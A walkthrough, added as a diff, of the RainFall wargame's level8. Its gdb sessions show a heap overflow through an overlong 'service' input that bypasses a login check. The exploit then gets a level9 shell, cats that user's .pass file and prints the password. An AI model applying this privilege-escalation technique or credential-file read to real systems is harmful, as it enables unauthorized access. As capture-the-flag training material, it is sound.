@@ -1,0 +1,122 @@
+Pseudo code was generate with IDA free (Hex-Rays)
+
+# step 1
+
+```bash
+# break just before the login condition check
+# "if ( *((_DWORD *)auth + 8) )" in hex-rays
+# "if (*(int *)(auth + 0x20) == 0) {" in ghidra
+(gdb) b *0x080486ea
+Breakpoint 1 at 0x80486ea
+(gdb) run
+Starting program: /home/user/level8/level8 
+(nil), (nil) 
+auth A
+0x804a008, (nil) 
+login
+
+Breakpoint 1, 0x080486ea in main ()
+# print memory from auth address
+(gdb) x/100x auth
+0x804a008:	0x00000a41	0x00000000	0x00000000	0x00020ff1
+0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
+...
+
+=> We need auth + 0x20 != 0
+=> auth = 0x804a008
+=> auth + 0x20 = 0x804a028
+=> We need to write something at 0x804a028
+
+=> just to verify, we write smth in this cell
+(gdb) set {int}0x804a028 = 0x1
+
+(gdb) continue
+login
+whoami
+>> level8
+
+=> We access the shell (but with wrong permission in gdb, whoami says level8)
+```
+
+# Step 2
+
+We start again
+
+```bash
+(gdb) b *0x080486ea
+Breakpoint 1 at 0x80486ea
+(gdb) run
+Starting program: /home/user/level8/level8 
+(nil), (nil) 
+auth A
+0x804a008, (nil) 
+service BBBB
+0x804a008, 0x804a018 
+login
+
+Breakpoint 1, 0x080486ea in main ()
+(gdb) x/100x auth
+0x804a008:	0x00000a41	0x00000000	0x00000000	0x00000011
+0x804a018:	0x42424220	0x00000a42	0x00000000	0x00020fe1
+0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
+
+=> notice service writes from 0x804a018 and does not changes auth address
+```
+
+# Step 3
+
+Once again, this time we fill the memory from service address (just ensure to go past 0x804a028)
+
+```bash
+(gdb) b *0x080486ea
+Breakpoint 1 at 0x80486ea
+(gdb) run
+Starting program: /home/user/level8/level8 
+(nil), (nil) 
+auth A
+0x804a008, (nil) 
+service BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+0x804a008, 0x804a018 
+login
+
+Breakpoint 1, 0x080486ea in main ()
+(gdb) x/100x auth
+0x804a008:	0x00000a41	0x00000000	0x00000000	0x00000051
+0x804a018:	0x42424220	0x42424242	0x42424242	0x42424242
+0x804a028:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804a038:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804a048:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804a058:	0x42424242	0x000a4242	0x00000000	0x00020fa1
+0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
+...
+(gdb) continue
+login
+whoami
+>> level8
+```
+
+# Step 4
+
+So now let's try without gdb
+
+```bash
+level8@RainFall:~$ ./level8 
+(nil), (nil) 
+auth A
+0x804a008, (nil) 
+service BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+0x804a008, 0x804a018 
+login
+$ whoami
+level9
+$ pwd 
+/home/user/level8
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+```
